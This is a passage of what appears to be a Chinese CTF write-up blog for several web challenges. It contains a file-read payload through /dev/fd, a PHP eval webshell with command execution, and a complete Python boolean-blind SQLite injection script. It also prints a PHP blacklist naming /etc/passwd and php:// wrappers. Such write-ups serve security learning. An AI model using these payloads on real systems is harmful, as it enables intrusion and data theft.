+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">achillesDistanceSpan</span>.<span style="color:#a6e22e">textContent</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">achillesPos</span>.<span style="color:#a6e22e">toFixed</span>(<span style="color:#ae81ff">2</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">tortoiseDistanceSpan</span>.<span style="color:#a6e22e">textContent</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">tortoisePos</span>.<span style="color:#a6e22e">toFixed</span>(<span style="color:#ae81ff">2</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">chaseBtn</span>.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#39;click&#39;</span>, () =&gt; {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Achilles moves to the tortoise&#39;s current position
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">achillesMoveDistance</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">tortoisePos</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">achillesPos</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">achillesPos</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">tortoisePos</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// The tortoise moves 1/10th of the distance Achilles just covered
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">tortoiseMoveDistance</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">achillesMoveDistance</span> <span style="color:#f92672">/</span> <span style="color:#ae81ff">10</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">tortoisePos</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">tortoiseMoveDistance</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">achillesDistanceSpan</span>.<span style="color:#a6e22e">textContent</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">achillesPos</span>.<span style="color:#a6e22e">toFixed</span>(<span style="color:#ae81ff">2</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">tortoiseDistanceSpan</span>.<span style="color:#a6e22e">textContent</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">tortoisePos</span>.<span style="color:#a6e22e">toFixed</span>(<span style="color:#ae81ff">2</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">achilles_distance</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">achillesPos</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">tortoise_distance</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">tortoisePos</span>,
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;/chase&#39;</span>, {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;POST&#39;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;Content-Type&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;application/json&#39;</span>,
+</span></span><span style="display:flex;"><span>            },
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({ <span style="color:#e6db74">&#34;data&#34;</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">encryptData</span>(<span style="color:#a6e22e">payload</span>) }),
+</span></span><span style="display:flex;"><span>        })
+</span></span><span style="display:flex;"><span>        .<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">response</span> =&gt; <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">json</span>())
+</span></span><span style="display:flex;"><span>        .<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">encryptedResponse</span> =&gt; {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">encryptedResponse</span>.<span style="color:#a6e22e">data</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">decryptData</span>(<span style="color:#a6e22e">encryptedResponse</span>.<span style="color:#a6e22e">data</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">flag</span>) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">// Use &#39;pre-wrap&#39; to respect newlines in the fake flag message
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                    <span style="color:#a6e22e">resultDiv</span>.<span style="color:#a6e22e">style</span>.<span style="color:#a6e22e">whiteSpace</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;pre-wrap&#39;</span>;
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">resultDiv</span>.<span style="color:#a6e22e">textContent</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`你追上它了！\n</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">flag</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>;
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">chaseBtn</span>.<span style="color:#a6e22e">disabled</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">message</span>) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">resultDiv</span>.<span style="color:#a6e22e">textContent</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">message</span>;
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#39;Error:&#39;</span>, <span style="color:#a6e22e">encryptedResponse</span>.<span style="color:#a6e22e">error</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">resultDiv</span>.<span style="color:#a6e22e">textContent</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`发生错误: </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">encryptedResponse</span>.<span style="color:#a6e22e">error</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        })
+</span></span><span style="display:flex;"><span>        .<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">error</span> =&gt; {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#39;Error:&#39;</span>, <span style="color:#a6e22e">error</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">resultDiv</span>.<span style="color:#a6e22e">textContent</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;发生错误。&#39;</span>;
+</span></span><span style="display:flex;"><span>        });
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>}); 
+</span></span></code></pre></div><h1 id="vibe-seo">Vibe SEO<a hidden class="anchor" aria-hidden="true" href="#vibe-seo">#</a></h1>
+<p>#目录扫描</p>
+<p>题目描述：&ldquo;我让 AI 帮我做了搜索引擎优化，它好像说什么『搜索引擎喜欢结构化的站点地图』，虽然不是很懂就是了&rdquo;</p>
+<p>网站首页什么信息都没有，但是根据题目描述中的信息，SEO (Search Engine Optimization)，就是搜索引擎优化，可以访问一些与之相关的文件目录，如：robots.txt，sitemap.xml 等，dirsearch 中也包含了这些常见目录，<strong>得到 /sitemap.xml</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-XML" data-lang="XML"><span style="display:flex;"><span><span style="color:#f92672">&lt;urlset</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://www.sitemaps.org/schemas/sitemap/0.9&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;url&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;loc&gt;</span>http://localhost/<span style="color:#f92672">&lt;/loc&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;changefreq&gt;</span>weekly<span style="color:#f92672">&lt;/changefreq&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/url&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;url&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;loc&gt;</span>http://localhost/aa__^^.php<span style="color:#f92672">&lt;/loc&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;changefreq&gt;</span>never<span style="color:#f92672">&lt;/changefreq&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/url&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/urlset&gt;</span>
+</span></span></code></pre></div><ul>
+<li>暴露了 aa__^^.php 文件</li>
+</ul>
+<p><strong>访问 /aa__^^.php 目录，显示了一些报错</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>**Warning**: Undefined array key &#34;filename&#34; in **/var/www/html/aa__^^.php** on line **3**  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>**Deprecated**: strlen(): Passing null to parameter #1 ($string) of type string is deprecated in **/var/www/html/aa__^^.php** on line **3**  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>**Warning**: Undefined array key &#34;filename&#34; in **/var/www/html/aa__^^.php** on line **4**  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>**Deprecated**: readfile(): Passing null to parameter #1 ($filename) of type string is deprecated in **/var/www/html/aa__^^.php** on line **4**  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>**Fatal error**: Uncaught ValueError: Path cannot be empty in /var/www/html/aa__^^.php:4 Stack trace: #0 /var/www/html/aa__^^.php(4): readfile(&#39;&#39;) #1 {main} thrown in **/var/www/html/aa__^^.php** on line **4**
+</span></span></code></pre></div><p><strong>明显看出没有定义<code>filename</code>参数，用 GET 和 POST 方法都试一下，得到 filename 是通过 GET 传递的参数，猜测 filename 可以是本地文件名，所以用<code>?filename=/etc/passwd</code>测试，显示 Filename too long，那就查看 aa__^^.php 文件本身</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PHP" data-lang="PHP"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>$flag <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#39;/my_secret.txt&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strlen</span>($_GET[<span style="color:#e6db74">&#39;filename&#39;</span>]) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">11</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">readfile</span>($_GET[<span style="color:#e6db74">&#39;filename&#39;</span>]);
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Filename too long&#34;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><ul>
+<li>限制查询文件字符数量要小于 11</li>
+</ul>
+<p><strong>需要知道 Linux/Unix 操作系统中的文件描述符相关知识，这里需要用 /dev/fd 目录，这个目录包含指向当前进程已打开的文件描述符的符号链接，访问<code>/dev/fd/n</code>实际上就是访问当前进程中与文件描述符 <code>n</code> 关联的那个底层文件或流，经过测试 /dev/fd/12 是 aa__^^.php 文件，/dev/fd/13 是 my_secret.txt 文件，最终 Payload 如下</strong></p>
+<pre tabindex="0"><code class="language-Payload" data-lang="Payload">?filename=/dev/fd/13
+</code></pre><h1 id="one_last_image">one_last_image<a hidden class="anchor" aria-hidden="true" href="#one_last_image">#</a></h1>
+<p>#文件上传 #WAF</p>
+<p>题目描述：第一次接受文件上传时，并没有什么特别的感觉，因为独属于我的waf，我早已部署。再见了，所有的一句话木马，Can you give me one last shell?</p>
+<p>网站首页是一个图片渲染小工具，发送正常的图片，并用 BurpSuite 拦截发送到重放器中进行测试，观察 Response 得到</p>
+<pre tabindex="0"><code class="language-Response" data-lang="Response">{&#34;input_url&#34;:&#34;uploads\/217b6235-e6d7-40bb-a4bf-0598af8c03cf.png&#34;,&#34;output_url&#34;:&#34;outputs\/217b6235-e6d7-40bb-a4bf-0598af8c03cf.png&#34;}
+</code></pre><p>也就是说，要上传的图片会先上传到 /uploads 目录，然后经过重新渲染将新图片生成到 /outputs 目录，访问 /uploads 目录，发现是 Apache web 服务器，后续可能要利用 .htaccess 文件</p>
+<p>经过文件内容上传测试，PHP 文件后缀没有过滤，文件内容中过滤了<code>php</code>字符，所以这里<strong>直接用 PHP 短标签直接绕过即可</strong></p>
+<pre tabindex="0"><code class="language-Payload" data-lang="Payload"># 上传文件内容 
+&lt;? eval($_GET[&#39;cmd&#39;]); ?&gt;
+# 远程代码执行
+...uploads/xxx.php?cmd=system(&#39;env | grep SYC&#39;);
+...uploads/xxx.php?cmd=phpinfo();
+</code></pre><p><strong>这题 flag 藏在环境变量中不太常规</strong></p>
+<h1 id="sequal-no-uta">Sequal No Uta<a hidden class="anchor" aria-hidden="true" href="#sequal-no-uta">#</a></h1>
+<p>#SQLite #SQLI #布尔盲注</p>
+<p>题目描述：SQLite Ma U</p>
+<p>网站首页是一个用户登录界面，根据题目描述应该是一道 SQLI 题目而且数据库管理系统为 SQLite，手工注入测试注入点得到<code>/check.php?name=0'/**/or/**/1=1/**/--+</code>，过滤了空格，查询成功了显示<code>该用户存在且活跃</code>，查询失败显示<code>未找到用户或已停用</code>，<strong>是一个典型的布尔盲注</strong></p>
+<p><strong>因为这题用的是 SQLite 不是常规的 MySql 等，语法之间有些许差异，这里就列出一些这题要用的差别</strong></p>
+<ul>
+<li><code>ascii()</code>函数用<code>unicode()</code>函数替代即可，语法相同</li>
+<li>SQLite 中的的系统表为<code>sqlite_master</code>类似于 MySql 中的<code>information_schema</code></li>
+<li>查询表名用<code>select tbl_name from sqlite_master where type='table'</code></li>
+<li>查询表中的列信息用<code>select group_concat(name) from pragma_table_info('&lt;table_name&gt;')</code></li>
+<li>limit 的用法为<code>limit &lt;要返回的行数&gt; offset &lt;要跳过的行数&gt;</code></li>
+<li>&hellip;&hellip;</li>
+</ul>
+<p><strong>查表名语句</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#e6db74">&#39; or (select unicode(substr(tbl_name,{i},1)) from sqlite_master where type=&#39;</span><span style="color:#66d9ef">table</span><span style="color:#e6db74">&#39; limit 1)={j} --+
+</span></span></span></code></pre></div><p><strong>查列名语句</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#e6db74">&#39; or (select unicode(substr(group_concat(name),{i},1)) from pragma_table_info(&#39;</span>users<span style="color:#e6db74">&#39;))={j} --+
+</span></span></span></code></pre></div><p><strong>查 flag 语句</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#e6db74">&#39; or (select unicode(substr(secret,{i},1)) from users limit 1)={j} --+
+</span></span></span></code></pre></div><p><strong>具体脚本</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 设置 url</span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://xxx.geek.ctfplus.cn/check.php&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 设置注入成功的标志</span>
+</span></span><span style="display:flex;"><span>success_indicator <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;该用户存在且活跃&#39;</span>
+</span></span><span style="display:flex;"><span>session <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>session()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">bool_blind_sqli</span>():
+</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;开始盲注查询：&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 设置查询最长长度</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">50</span>):
+</span></span><span style="display:flex;"><span>        found_char <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># 设置字符的 ASCII 值范围（可打印字符）</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">128</span>):
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># payload = f&#34;0&#39;/**/or/**/(select/**/unicode(substr(tbl_name,{i},1))/**/from/**/sqlite_master/**/where/**/type=&#39;table&#39;/**/limit/**/1)={j}/**/--+&#34;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># payload = f&#34;0&#39;/**/or/**/(select/**/unicode(substr(group_concat(name),{i},1))/**/from/**/pragma_table_info(&#39;users&#39;))={j}/**/--+&#34;</span>
+</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;0&#39;/**/or/**/(select/**/unicode(substr(secret,</span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">,1))/**/from/**/users/**/limit/**/1)=</span><span style="color:#e6db74">{</span>j<span style="color:#e6db74">}</span><span style="color:#e6db74">/**/--+&#34;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># 发送 GET 请求</span>
+</span></span><span style="display:flex;"><span>            response <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">?name=</span><span style="color:#e6db74">{</span>payload<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> success_indicator <span style="color:#f92672">in</span> response<span style="color:#f92672">.</span>text:
+</span></span><span style="display:flex;"><span>                result <span style="color:#f92672">+=</span> chr(j)
+</span></span><span style="display:flex;"><span>                found_char <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;找到第 </span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74"> 个字符：</span><span style="color:#e6db74">{</span>chr(j)<span style="color:#e6db74">}</span><span style="color:#e6db74">，当前结果：</span><span style="color:#e6db74">{</span>result<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># 如果内层循环没有找到字符，说明字符串已结束</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> found_char:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;盲注结束&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> result
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>str <span style="color:#f92672">=</span> bool_blind_sqli()
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;获得的结果：</span><span style="color:#e6db74">{</span>str<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><h1 id="ez-seralize">ez-seralize<a hidden class="anchor" aria-hidden="true" href="#ez-seralize">#</a></h1>
+<p>#代码审计 #目录扫描 #Phar</p>
+<p>题目描述：简单的读文件?</p>
+<p>网站首页有一个文件读取的功能，那直接<strong>读取 index.php 得到</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PHP" data-lang="PHP"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ini_set</span>(<span style="color:#e6db74">&#39;display_errors&#39;</span>, <span style="color:#e6db74">&#39;0&#39;</span>);
+</span></span><span style="display:flex;"><span>$filename <span style="color:#f92672">=</span> <span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;filename&#39;</span>]) <span style="color:#f92672">?</span> $_GET[<span style="color:#e6db74">&#39;filename&#39;</span>] <span style="color:#f92672">:</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>$content <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>$error <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($filename) <span style="color:#f92672">&amp;&amp;</span> $filename <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;&#39;</span>) {
+</span></span><span style="display:flex;"><span>    $balcklist <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;../&#34;</span>,<span style="color:#e6db74">&#34;%2e&#34;</span>,<span style="color:#e6db74">&#34;..&#34;</span>,<span style="color:#e6db74">&#34;data://&#34;</span>,<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">&#34;input&#34;</span>,<span style="color:#e6db74">&#34;%0a&#34;</span>,<span style="color:#e6db74">&#34;%&#34;</span>,<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">&#34;%0d&#34;</span>,<span style="color:#e6db74">&#34;php://&#34;</span>,<span style="color:#e6db74">&#34;/etc/passwd&#34;</span>,<span style="color:#e6db74">&#34;/proc/self/environ&#34;</span>,<span style="color:#e6db74">&#34;php:file&#34;</span>,<span style="color:#e6db74">&#34;filter&#34;</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">foreach</span> ($balcklist <span style="color:#66d9ef">as</span> $v) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strpos</span>($filename, $v) <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span>) {
+</span></span><span style="display:flex;"><span>            $error <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;no no no&#34;</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($error <span style="color:#f92672">===</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;serialized&#39;</span>])) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">require</span> <span style="color:#e6db74">&#39;function.php&#39;</span>;
+</span></span><span style="display:flex;"><span>            $file_contents<span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>($filename);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ($file_contents <span style="color:#f92672">===</span> <span style="color:#66d9ef">false</span>) {
+</span></span><span style="display:flex;"><span>                $error <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Failed to read seraizlie file or file does not exist: &#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">htmlspecialchars</span>($filename);
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                $content <span style="color:#f92672">=</span> $file_contents;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            $file_contents <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>($filename);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ($file_contents <span style="color:#f92672">===</span> <span style="color:#66d9ef">false</span>) {
+</span></span><span style="display:flex;"><span>                $error <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Failed to read file or file does not exist: &#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">htmlspecialchars</span>($filename);
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                $content <span style="color:#f92672">=</span> $file_contents;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    $error <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><ul>
+<li>读取文件名经过黑名单过滤，<code>phar://</code>不在黑名单中</li>
+<li>要 GET 方法传入<code>serialized</code>参数，才可以执行关键代码</li>
+<li>发现 function.php 文件</li>
+</ul>
+<p><strong>读取 function.php 文件</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PHP" data-lang="PHP"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">A</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $file;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $luo;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__construct</span>() {
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__toString</span>() {
+</span></span><span style="display:flex;"><span>        $function <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">luo</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $function();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">B</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $a;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $test;
+</span></span><span style="display:flex;"><span>
